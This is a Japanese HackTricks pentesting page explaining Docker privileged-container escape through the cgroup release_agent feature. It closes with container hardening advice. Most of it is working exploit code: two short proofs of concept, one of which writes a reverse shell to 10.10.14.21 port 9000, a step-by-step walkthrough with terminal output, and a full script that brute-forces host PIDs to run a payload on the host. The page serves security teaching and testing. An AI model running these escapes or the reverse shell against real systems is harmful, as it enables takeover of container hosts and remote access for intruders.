<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>


# `--privileged`フラグ

{% code title="初期PoC" %}
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o;
echo $t/c >$d/release_agent;
echo "#!/bin/sh $1 >$t/o" >/c;
chmod +x /c;
sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
{% code title="第二のPoC" %}
```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# In the container
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/10.10.14.21/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
head /output
```
{% endcode %}

`--privileged`フラグは、重大なセキュリティ上の懸念を引き起こし、このエクスプロイトはそれを有効にした状態でDockerコンテナを起動することに依存しています。このフラグを使用すると、コンテナはすべてのデバイスに完全なアクセス権を持ち、seccomp、AppArmor、およびLinuxの機能制限がありません。

実際には、この方法でDockerコンテナから脱出するために必要な権限は、次のとおりです。

1. コンテナ内でrootとして実行している必要があります。
2. コンテナは`SYS_ADMIN` Linux機能を持つように実行されている必要があります。
3. コンテナにはAppArmorプロファイルがないか、または`mount`シスコールを許可するように設定されている必要があります。
4. コンテナ内でcgroup v1仮想ファイルシステムが読み書き可能にマウントされている必要があります。

`SYS_ADMIN`機能は、コンテナが`mount`シスコールを実行できるようにします（[man 7 capabilities](https://linux.die.net/man/7/capabilities)を参照）。[Dockerはデフォルトで制限されたセットの機能でコンテナを起動します](https://docs.docker.com/engine/security/security/#linux-kernel-capabilities)が、セキュリティ上のリスクのために`SYS_ADMIN`機能は有効にしません。

さらに、Dockerはデフォルトで`docker-default` AppArmorポリシーでコンテナを起動しますが、[`mount`シスコールの使用を防止します](https://github.com/docker/docker-ce/blob/v18.09.8/components/engine/profiles/apparmor/template.go#L35)、たとえコンテナが`SYS_ADMIN`で実行されていてもです。

このテクニックに対して脆弱なコンテナは、次のフラグで実行された場合です：`--security-opt apparmor=unconfined --cap-add=SYS_ADMIN`

## Proof of Conceptの解説

このテクニックを使用するための要件を理解し、Proof of Conceptのエクスプロイトを洗練させたので、それを行ごとに説明して、その動作を示します。

このエクスプロイトをトリガーするためには、`release_agent`ファイルを作成し、cgroup内のすべてのプロセスを終了させることで`release_agent`が呼び出されるcgroupが必要です。これを実現するための最も簡単な方法は、cgroupコントローラをマウントし、子cgroupを作成することです。

それを行うために、`/tmp/cgrp`ディレクトリを作成し、[RDMA](https://www.kernel.org/doc/Documentation/cgroup-v1/rdma.txt) cgroupコントローラをマウントし、子cgroup（この例では「x」という名前）を作成します。すべてのcgroupコントローラがテストされているわけではありませんが、このテクニックはほとんどのcgroupコントローラで動作するはずです。

もし「mount: /tmp/cgrp: special device cgroup does not exist」と表示された場合は、RDMA cgroupコントローラがセットアップされていないためです。それを修正するには、`rdma`を`memory`に変更してください。RDMAを使用しているのは、元のPoCがそれに対してのみ設計されていたためです。

cgroupコントローラはグローバルなリソースであり、異なる権限で複数回マウントすることができ、1つのマウントで行われた変更は他のマウントにも適用されます。

以下に、「x」という子cgroupの作成とそのディレクトリリストを示します。
```text
root@b11cf9eab4fd:/# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
root@b11cf9eab4fd:/# ls /tmp/cgrp/
cgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  release_agent  tasks  x
root@b11cf9eab4fd:/# ls /tmp/cgrp/x
cgroup.clone_children  cgroup.procs  notify_on_release  rdma.current  rdma.max  tasks
```
次に、「x」cgroupのリリース時にcgroup通知を有効にするために、`notify_on_release`ファイルに1を書き込みます。また、RDMA cgroupのリリースエージェントを実行するために、ホスト上の`release_agent`ファイルにコンテナ内で後で作成する`/cmd`スクリプトのパスを書き込みます。これを行うために、コンテナのパスをホスト上の`/etc/mtab`ファイルから取得します。

コンテナに追加または変更するファイルはホスト上に存在し、コンテナ内のパスとホスト上のパスの両方から変更することが可能です。

これらの操作は以下のように表示されます：
```text
root@b11cf9eab4fd:/# echo 1 > /tmp/cgrp/x/notify_on_release
root@b11cf9eab4fd:/# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
root@b11cf9eab4fd:/# echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
ホスト上に作成する予定の `/cmd` スクリプトのパスに注意してください。
```text
root@b11cf9eab4fd:/# cat /tmp/cgrp/release_agent
/var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/cmd
```
次に、`/cmd`スクリプトを作成します。このスクリプトは`ps aux`コマンドを実行し、その出力をコンテナ内の`/output`に保存します。ホスト上の出力ファイルのフルパスを指定します。最後に、スクリプトの内容を表示するために`/cmd`スクリプトを印刷します。

```bash
#!/bin/bash

ps aux > /output

cat /cmd
```
```text
root@b11cf9eab4fd:/# echo '#!/bin/sh' > /cmd
root@b11cf9eab4fd:/# echo "ps aux > $host_path/output" >> /cmd
root@b11cf9eab4fd:/# chmod a+x /cmd
root@b11cf9eab4fd:/# cat /cmd
#!/bin/sh
ps aux > /var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/output
```
最後に、攻撃を実行することができます。まず、即座に終了するプロセスを「x」の子cgroup内で生成します。`/bin/sh`プロセスを作成し、そのPIDを「x」の子cgroupディレクトリ内の`cgroup.procs`ファイルに書き込むことで、ホスト上のスクリプトが`/bin/sh`の終了後に実行されます。次に、ホスト上で実行された`ps aux`の出力をコンテナ内の`/output`ファイルに保存します。
```text
root@b11cf9eab4fd:/# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
root@b11cf9eab4fd:/# head /output
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.1  1.0  17564 10288 ?        Ss   13:57   0:01 /sbin/init
root         2  0.0  0.0      0     0 ?        S    13:57   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        I<   13:57   0:00 [rcu_gp]
root         4  0.0  0.0      0     0 ?        I<   13:57   0:00 [rcu_par_gp]
root         6  0.0  0.0      0     0 ?        I<   13:57   0:00 [kworker/0:0H-kblockd]
root         8  0.0  0.0      0     0 ?        I<   13:57   0:00 [mm_percpu_wq]
root         9  0.0  0.0      0     0 ?        S    13:57   0:00 [ksoftirqd/0]
root        10  0.0  0.0      0     0 ?        I    13:57   0:00 [rcu_sched]
root        11  0.0  0.0      0     0 ?        S    13:57   0:00 [migration/0]
```
# `--privileged` フラグ v2

以前の PoC は、コンテナがマウントポイントのホストパス全体を公開するストレージドライバ（例：`overlayfs`）で構成されている場合には問題ありませんが、最近、ホストファイルシステムのマウントポイントが明示的に開示されていないいくつかの設定に遭遇しました。

## Kata Containers
```text
root@container:~$ head -1 /etc/mtab
kataShared on / type 9p (rw,dirsync,nodev,relatime,mmap,access=client,trans=virtio)
```
[Kata Containers](https://katacontainers.io/)はデフォルトでコンテナのルートファイルシステムを`9pfs`上にマウントします。これにより、Kata Containers仮想マシン内のコンテナファイルシステムの場所に関する情報は公開されません。

\* Kata Containersについては、将来のブログ記事で詳しく説明します。

## デバイスマッパー
```text
root@container:~$ head -1 /etc/mtab
/dev/sdc / ext4 rw,relatime,stripe=384 0 0
```
私はライブ環境でこのルートマウントを持つコンテナを見ました。おそらく、コンテナは特定の `devicemapper` ストレージドライバの設定で実行されていたと思いますが、テスト環境でこの動作を再現することができませんでした。

## 代替 PoC

明らかに、これらの場合にはホストファイルシステム上のコンテナファイルのパスを特定するための十分な情報がありませんので、Felixの PoC をそのまま使用することはできません。しかし、少しの工夫を使ってこの攻撃を実行することはできます。

必要な唯一の重要な情報は、コンテナ内で実行するファイルのホストに対する完全なパスです。コンテナ内のマウントポイントからこれを判別することができない場合は、他の場所を探す必要があります。

### Proc が救済策 <a id="proc-to-the-rescue"></a>

Linux の `/proc` 擬似ファイルシステムは、システム上で実行されているすべてのプロセス、例えばコンテナ内のプロセスを含む、カーネルのプロセスデータ構造を公開します。これは、コンテナ内でコマンドを実行し、ホスト上のプロセスの `/proc` ディレクトリにアクセスすることで示すことができます。
```bash
root@container:~$ sleep 100
```

```bash
root@host:~$ ps -eaf | grep sleep
root     28936 28909  0 10:11 pts/0    00:00:00 sleep 100
root@host:~$ ls -la /proc/`pidof sleep`
total 0
dr-xr-xr-x   9 root root 0 Nov 19 10:03 .
dr-xr-xr-x 430 root root 0 Nov  9 15:41 ..
dr-xr-xr-x   2 root root 0 Nov 19 10:04 attr
-rw-r--r--   1 root root 0 Nov 19 10:04 autogroup
-r--------   1 root root 0 Nov 19 10:04 auxv
-r--r--r--   1 root root 0 Nov 19 10:03 cgroup
--w-------   1 root root 0 Nov 19 10:04 clear_refs
-r--r--r--   1 root root 0 Nov 19 10:04 cmdline
...
-rw-r--r--   1 root root 0 Nov 19 10:29 projid_map
lrwxrwxrwx   1 root root 0 Nov 19 10:29 root -> /
-rw-r--r--   1 root root 0 Nov 19 10:29 sched
...
```
_ちなみに、`/proc/<pid>/root`データ構造は、私が非常に長い間混乱していたものでした。なぜ`/`へのシンボリックリンクが有用なのか理解できませんでしたが、manページの実際の定義を読んでから理解できました。_

> /proc/\[pid\]/root
>
> UNIXとLinuxは、chroot\(2\)システムコールによって設定されるプロセスごとのファイルシステムのルートをサポートしています。このファイルは、プロセスのルートディレクトリを指すシンボリックリンクであり、exeやfd/\*と同じように動作します。
>
> ただし、このファイルは単なるシンボリックリンクではありません。プロセス自体と同じファイルシステムのビュー（名前空間とプロセスごとのマウントのセットを含む）を提供します。

`/proc/<pid>/root`シンボリックリンクは、コンテナ内の任意のファイルへのホスト相対パスとして使用できます：Container
```bash
root@container:~$ echo findme > /findme
root@container:~$ sleep 100
```

```bash
root@host:~$ cat /proc/`pidof sleep`/root/findme
findme
```
この攻撃の要件は、コンテナ内のファイルの完全なパスをコンテナホストに対して知る必要から、コンテナ内で実行されている_任意の_プロセスのpidを知る必要に変更されます。

### Pid Bashing <a id="pid-bashing"></a>

これは実際には簡単な部分です。LinuxでのプロセスIDは数値であり、順次割り当てられます。`init`プロセスにはプロセスID `1`が割り当てられ、それ以降のプロセスには増分のIDが割り当てられます。コンテナ内のプロセスのホストプロセスIDを特定するために、ブルートフォースの増分検索が使用されます。
```text
root@container:~$ echo findme > /findme
root@container:~$ sleep 100
```
ホスト
```bash
root@host:~$ COUNTER=1
root@host:~$ while [ ! -f /proc/${COUNTER}/root/findme ]; do COUNTER=$((${COUNTER} + 1)); done
root@host:~$ echo ${COUNTER}
7822
root@host:~$ cat /proc/${COUNTER}/root/findme
findme
```
### すべてを組み合わせる <a id="putting-it-all-together"></a>

この攻撃を完了するために、ブルートフォース技術を使用してパス `/proc/<pid>/root/payload.sh` の pid を推測することができます。各反復で推測された pid パスを cgroups の `release_agent` ファイルに書き込み、`release_agent` をトリガーし、出力ファイルが作成されるかどうかを確認します。

この技術の唯一の注意点は、それがどのような形であれ、決して微妙ではなく、pid の数を非常に高くする可能性があることです。長時間実行されるプロセスは実行されないため、信頼性の問題は発生しないはずですが、私の言葉を引用しないでください。

以下の PoC は、cgroups の `release_agent` 機能を使用して特権コンテナからの脱出の最初の PoC よりも一般的な攻撃を提供するために、これらの技術を実装しています:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
特権コンテナ内でPoCを実行すると、次のような出力が得られるはずです。
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
# コンテナを安全に使用する

Dockerはデフォルトでコンテナを制限しています。これらの制限を緩めるとセキュリティ上の問題が発生する可能性があります。`--privileged`フラグの完全な権限を持たなくても、追加の権限の影響を認識し、全体的に最小限の権限に制限することが重要です。

コンテナを安全に保つためには以下のことに注意してください：

* `--privileged`フラグを使用しないでください。また、コンテナ内に[Dockerソケットをマウント](https://raesene.github.io/blog/2016/03/06/The-Dangers-Of-Docker.sock/)しないでください。Dockerソケットはコンテナの生成を可能にするため、別の`--privileged`フラグを持つコンテナを実行するなど、ホストの完全な制御を簡単に取得する方法です。
* コンテナ内でrootとして実行しないでください。[異なるユーザー](https://docs.docker.com/develop/develop-images/dockerfile_best-practices/#user)または[ユーザーネームスペース](https://docs.docker.com/engine/security/userns-remap/)を使用してください。コンテナ内のrootは、ユーザーネームスペースでリマップされていない限り、ホストと同じです。主にLinuxのネームスペース、機能、およびcgroupsによって制限されています。
* [すべての機能を削除](https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities)（`--cap-drop=all`）し、必要な機能のみを有効にします（`--cap-add=...`）。多くのワークロードでは機能は必要ありませんし、それらを追加することで攻撃の範囲が広がります。
* プロセスが特権を取得するのを防ぐために、[「no-new-privileges」セキュリティオプション](https://raesene.github.io/blog/2019/06/01/docker-capabilities-and-no-new-privs/)を使用してください。たとえば、suidバイナリを介して特権を取得することがあります。
* コンテナに利用可能なリソースを制限してください。リソース制限は、サービス拒否攻撃からマシンを保護するのに役立ちます。
* [seccomp](https://docs.docker.com/engine/security/seccomp/)、[AppArmor](https://docs.docker.com/engine/security/apparmor/)（またはSELinux）プロファイルを調整して、コンテナで利用可能なアクションとシスコールを最小限に制限してください。
* [公式のDockerイメージ](https://docs.docker.com/docker-hub/official_images/)を使用するか、それらを基に独自のイメージをビルドしてください。[バックドアが仕込まれた](https://arstechnica.com/information-technology/2018/06/backdoored-images-downloaded-5-million-times-finally-removed-from-docker-hub/)イメージを継承または使用しないでください。
* セキュリティパッチを適用するために定期的にイメージを再ビルドしてください。これは言うまでもありません。

# 参考文献

* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
* [https://twitter.com/\_fel1x/status/1151487051986087936](https://twitter.com/_fel1x/status/1151487051986087936)
* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンやHackTricksのPDFをダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォロー**してください。

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください**。

</details>
